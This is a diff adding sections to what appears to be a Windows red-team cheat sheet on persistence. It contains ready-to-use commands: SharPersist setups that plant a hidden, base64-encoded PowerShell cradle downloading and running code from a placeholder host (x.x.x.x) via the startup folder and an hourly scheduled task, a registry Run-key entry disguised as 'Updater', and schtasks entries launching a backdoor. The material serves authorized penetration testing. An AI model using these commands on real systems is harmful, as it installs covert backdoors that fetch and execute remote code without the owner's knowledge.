@@ -331,23 +331,46 @@ runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
 
 ## System persistence
 ### Userland
-#### Startup
+### Startup
 - Batch script inside user directory ```$env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\'```
 
-#### Registery keys
+#### Startup folder sharpersist.exe
+- Download an execute cradle as persistence
+```
+str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -f "UserEnvSetup" -m add
+```
+
+### Registery keys
 - https://attack.mitre.org/techniques/T1060/
 
-#### LNK
+#### Registery sharpersist.exe
+- ```-k``` is the registry key to modify.
+- ```-v``` is the name of the registry key to create.
+```
+SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
+```
+
+### LNK
 - Modify links to execute arbritary code
 - https://github.com/HarmJ0y/Misc-PowerShell/blob/master/BackdoorLNK.ps1
 
-#### Schtasks
+### Schtasks
 ```
 # Daily at 10:00
 schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc daily /st 10:00
 
 # Run a task each time the user's sessions is idle for 10 minutes
 schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc onidle /i 10
+```
+
+##### schtask sharpersist.exe
+- Download an execute cradle as persistence
+```
+str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -n "Updater" -m add -o hourly
 ```
 
 #### Microsoft Office Trusted Locations
